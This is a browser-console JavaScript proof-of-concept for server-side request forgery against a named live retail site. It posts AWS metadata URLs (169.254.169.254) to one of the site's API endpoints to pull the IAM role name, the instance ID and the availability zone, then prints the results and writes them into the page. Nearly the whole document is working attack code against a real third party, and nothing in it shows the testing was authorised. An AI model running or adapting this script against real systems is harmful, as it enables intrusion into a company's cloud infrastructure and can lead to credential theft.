// 100% PROOF: SSRF to AWS Metadata Service
// Execute in browser console on zooplus.de (logged in)

console.log("%c[POC] SSRF to AWS Metadata Service - 100% PROOF", "color:red;font-size:20px;font-weight:bold");
console.log("=".repeat(70));

const ssrfEndpoint = "https://www.zooplus.de/zootopia-events/api/events/sites/1";

// Test 1: Get IAM Role Name
console.log("\n[1] Testing: AWS Metadata IAM Role Name...");
fetch(ssrfEndpoint, {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  })
})
.then(r => r.text())
.then(text => {
  console.log("%cAWS METADATA IAM ROLE NAME:", "color:red;font-size:40px;font-weight:bold");
  console.log(text);
  
  if (text && text.length > 0 && text !== "{}" && !text.includes("<!DOCTYPE")) {
    console.log("%c[SUCCESS] 100% PROOF - SSRF CONFIRMED!", "color:red;font-size:30px;font-weight:bold");
    console.log("%cIAM Role Name:", "color:green;font-size:20px", text);
    
    // Display on page
    document.body.innerHTML += "<h1 style='color:red;font-size:40px;'>AWS IAM ROLE: " + text + "</h1>";
    document.body.innerHTML += "<p style='color:red;font-size:20px;'>SSRF CONFIRMED - 100% PROOF</p>";
    
    // Save to variable for easy access
    window.awsIamRole = text;
  } else {
    console.log("%c[INFO] Empty response, trying instance-id...", "color:yellow;font-size:16px");
    
    // Test 2: Get Instance ID
    setTimeout(() => {
      console.log("\n[2] Testing: AWS Metadata Instance ID...");
      fetch(ssrfEndpoint, {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: "http://169.254.169.254/latest/meta-data/instance-id"
        })
      })
      .then(r => r.text())
      .then(id => {
        console.log("%cAWS INSTANCE ID:", "color:red;font-size:40px;font-weight:bold");
        console.log(id);
        
        if (id && id.length > 0 && id !== "{}" && id.startsWith("i-")) {
          console.log("%c[SUCCESS] 100% PROOF - SSRF CONFIRMED!", "color:red;font-size:30px;font-weight:bold");
          console.log("%cInstance ID:", "color:green;font-size:20px", id);
          
          // Display on page
          document.body.innerHTML += "<h1 style='color:red;font-size:40px;'>AWS INSTANCE ID: " + id + "</h1>";
          document.body.innerHTML += "<p style='color:red;font-size:20px;'>SSRF CONFIRMED - 100% PROOF</p>";
          
          // Save to variable
          window.awsInstanceId = id;
        } else {
          console.log("%c[INFO] Response:", "color:yellow;font-size:16px", id);
        }
      })
      .catch(e => console.error("[ERROR]", e));
    }, 1000);
  }
})
.catch(e => console.error("[ERROR]", e));

// Test 3: Get other metadata
setTimeout(() => {
  console.log("\n[3] Testing: AWS Metadata Availability Zone...");
  fetch(ssrfEndpoint, {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      url: "http://169.254.169.254/latest/meta-data/placement/availability-zone"
    })
  })
  .then(r => r.text())
  .then(az => {
    if (az && az.length > 0 && az !== "{}") {
      console.log("%cAWS Availability Zone:", "color:green;font-size:20px", az);
      window.awsAvailabilityZone = az;
    }
  })
  .catch(e => console.error("[ERROR]", e));
}, 3000);

console.log("\n[INFO] Tests started. Check console and page for results...");

